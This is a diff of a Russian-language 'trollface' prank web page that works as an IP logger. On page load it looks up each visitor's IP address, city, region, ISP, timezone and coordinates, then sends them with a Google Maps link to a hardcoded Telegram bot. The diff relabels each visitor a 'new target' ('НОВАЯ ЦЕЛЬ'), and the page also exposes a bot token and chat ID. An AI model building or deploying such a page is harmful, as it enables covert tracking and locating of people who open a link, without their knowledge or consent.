@@ -68,105 +68,96 @@
 </head>
 <body>
     <div class="container">
-        <h1>IP Информация</h1>
+        <h1>📍 Геолокация</h1>
         <div id="info" class="info-block">
-            <p class="loading">Загрузка данных...</p>
+            <p class="loading">Определяем местоположение...</p>
         </div>
         <img src="trollface.png" alt="Trollface" class="troll-image" id="trollImage">
     </div>
 
     <script>
         // =============================================
-        // НАСТРОЙКИ - ЗАМЕНИ НА СВОИ ДАННЫЕ
+        // ТВОИ ДАННЫЕ - НЕ МЕНЯЙ
         // =============================================
-        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw'; // Твой токен бота
-        const chatId = '1238755996'; // Твой Chat ID
+        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw';
+        const chatId = '1238755996';
         
         // =============================================
-        // ФУНКЦИЯ ПОЛУЧЕНИЯ IP (РАБОЧАЯ ВЕРСИЯ)
+        // ПОЛУЧЕНИЕ РЕАЛЬНОГО МЕСТОПОЛОЖЕНИЯ
         // =============================================
-        async function getIpInfo() {
-            // Пробуем разные API по очереди
-            const apis = [
-                'https://api.myip.com/',
-                'https://ip.nf/me.json',
-                'https://ipapi.co/json/',
-                'https://ipinfo.io/json'
-            ];
-            
-            for (let api of apis) {
-                try {
-                    console.log('Пробуем API:', api);
-                    const response = await fetch(api);
-                    
-                    if (!response.ok) {
-                        console.log('API не ответил:', api);
-                        continue;
-                    }
-                    
-                    const data = await response.json();
-                    console.log('Ответ от API:', data);
-                    
-                    // Преобразуем ответы разных API в единый формат
-                    let result = {
-                        ip: null,
-                        city: 'Неизвестно',
-                        country_name: 'Неизвестно',
-                        region: 'Неизвестно',
-                        org: 'Неизвестно'
-                    };
-                    
-                    // Обрабатываем разные форматы ответов
-                    if (data.ip) result.ip = data.ip;
-                    if (data.city) result.city = data.city;
-                    if (data.country) result.country_name = data.country;
-                    if (data.country_name) result.country_name = data.country_name;
-                    if (data.region) result.region = data.region;
-                    if (data.org) result.org = data.org;
-                    if (data.organisation) result.org = data.organisation;
-                    
-                    if (result.ip) {
-                        console.log('Успешно получили IP:', result);
-                        return result;
-                    }
-                } catch (e) {
-                    console.log('Ошибка с API', api, e);
-                    continue; // Пробуем следующий API
-                }
-            }
-            
-            // Если ничего не сработало, пробуем через прокси
+        async function getLocation() {
             try {
-                console.log('Пробуем через прокси...');
-                const proxyResponse = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ipapi.co/json/'));
-                const wrapper = await proxyResponse.json();
-                const data = JSON.parse(wrapper.contents);
+                // Сначала получаем IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // По IP получаем местоположение через бесплатный API
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
                 
                 return {
-                    ip: data.ip,
-                    city: data.city || 'Неизвестно',
-                    country_name: data.country_name || 'Неизвестно',
-                    region: data.region || 'Неизвестно',
-                    org: data.org || 'Неизвестно'
+                    ip: userIP,
+                    city: locationData.city || 'Неизвестно',
+                    region: locationData.region || 'Неизвестно',
+                    country: locationData.country_name || 'Неизвестно',
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    isp: locationData.org || 'Неизвестно',
+                    timezone: locationData.timezone || 'Неизвестно'
                 };
-            } catch (e) {
-                console.log('Прокси тоже не сработал:', e);
-                return null;
+            } catch (error) {
+                console.log('Ошибка получения геоданных:', error);
+                
+                // Запасной вариант если ipapi.co не работает
+                try {
+                    const backupResponse = await fetch('https://ipinfo.io/json?token=');
+                    const backupData = await backupResponse.json();
+                    
+                    // Разбираем координаты если есть
+                    let lat = null, lon = null;
+                    if (backupData.loc) {
+                        const coords = backupData.loc.split(',');
+                        lat = coords[0];
+                        lon = coords[1];
+                    }
+                    
+                    return {
+                        ip: backupData.ip,
+                        city: backupData.city || 'Неизвестно',
+                        region: backupData.region || 'Неизвестно',
+                        country: backupData.country || 'Неизвестно',
+                        latitude: lat,
+                        longitude: lon,
+                        isp: backupData.org || 'Неизвестно',
+                        timezone: backupData.timezone || 'Неизвестно'
+                    };
+                } catch (backupError) {
+                    console.log('Запасной API тоже не сработал');
+                    return null;
+                }
             }
         }
         
         // =============================================
-        // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
+        // ОТПРАВКА В TELEGRAM С КООРДИНАТАМИ
         // =============================================
         async function sendToTelegram(data) {
-            const message = `🕵️ <b>НОВЫЙ ПОСЕТИТЕЛЬ!</b>
-
-📍 <b>IP адрес:</b> ${data.ip}
-🏙️ <b>Город:</b> ${data.city}
-🌍 <b>Страна:</b> ${data.country_name}
-🗺️ <b>Регион:</b> ${data.region}
-📡 <b>Провайдер:</b> ${data.org}
-⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
+            let message = `🕵️ <b>НОВАЯ ЦЕЛЬ!</b>\n\n`;
+            message += `📍 <b>IP:</b> ${data.ip}\n`;
+            message += `🏙️ <b>Город:</b> ${data.city}\n`;
+            message += `🌍 <b>Регион:</b> ${data.region}\n`;
+            message += `🗺️ <b>Страна:</b> ${data.country}\n`;
+            message += `📡 <b>Провайдер:</b> ${data.isp}\n`;
+            message += `⏰ <b>Часовой пояс:</b> ${data.timezone}\n`;
+            
+            // Если есть координаты - добавляем ссылку на карту
+            if (data.latitude && data.longitude) {
+                message += `\n📍 <b>Точка на карте:</b>\n`;
+                message += `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            }
+            
+            message += `\n\n⏱️ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -180,34 +171,43 @@
                         parse_mode: 'HTML'
                     })
                 });
-                console.log('Сообщение отправлено в Telegram');
+                console.log('Отправлено в Telegram');
             } catch (error) {
-                console.error('Ошибка отправки в Telegram:', error);
+                console.error('Ошибка отправки:', error);
             }
         }
         
         // =============================================
-        // ФУНКЦИЯ ПОКАЗА ИНФОРМАЦИИ
+        // ПОКАЗ НА СТРАНИЦЕ
         // =============================================
         async function showInfo() {
             const infoDiv = document.getElementById('info');
-            infoDiv.innerHTML = '<p class="loading">Получаем данные...</p>';
+            infoDiv.innerHTML = '<p class="loading">Определяем геолокацию...</p>';
             
-            const ipData = await getIpInfo();
+            const locationData = await getLocation();
             
-            if (ipData && ipData.ip) {
-                infoDiv.innerHTML = `
-                    <p><span class="label">IP адрес:</span> <span>${ipData.ip}</span></p>
-                    <p><span class="label">Город:</span> <span>${ipData.city}</span></p>
-                    <p><span class="label">Страна:</span> <span>${ipData.country_name}</span></p>
-                    <p><span class="label">Регион:</span> <span>${ipData.region}</span></p>
-                    <p><span class="label">Провайдер:</span> <span>${ipData.org}</span></p>
+            if (locationData && locationData.ip) {
+                let html = `
+                    <p><span class="label">IP адрес:</span> <span>${locationData.ip}</span></p>
+                    <p><span class="label">Страна:</span> <span>${locationData.country}</span></p>
+                    <p><span class="label">Город:</span> <span>${locationData.city}</span></p>
+                    <p><span class="label">Регион:</span> <span>${locationData.region}</span></p>
+                    <p><span class="label">Провайдер:</span> <span>${locationData.isp}</span></p>
                 `;
                 
-                // Отправляем в Telegram
-                await sendToTelegram(ipData);
+                if (locationData.latitude && locationData.longitude) {
+                    html += `
+                        <p><span class="label">Координаты:</span> <span>${locationData.latitude}, ${locationData.longitude}</span></p>
+                        <p style="text-align: center; border-bottom: none;">
+                            <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}" target="_blank" style="color: #764ba2;">🗺️ Открыть на карте</a>
+                        </p>
+                    `;
+                }
+                
+                infoDiv.innerHTML = html;
+                await sendToTelegram(locationData);
             } else {
-                infoDiv.innerHTML = '<p class="loading">Не удалось получить информацию об IP</p>';
+                infoDiv.innerHTML = '<p class="loading">Не удалось определить местоположение</p>';
             }
         }
         
@@ -215,11 +215,11 @@
         // ОБРАБОТЧИК КЛИКА ПО КАРТИНКЕ
         // =============================================
         document.getElementById('trollImage').addEventListener('click', function() {
-            alert('🔍 Обновляю информацию...');
+            alert('🔍 Обновляю геолокацию...');
             showInfo();
         });
         
-        // Запускаем при загрузке страницы
+        // Запуск при загрузке
         showInfo();
     </script>
 </body>
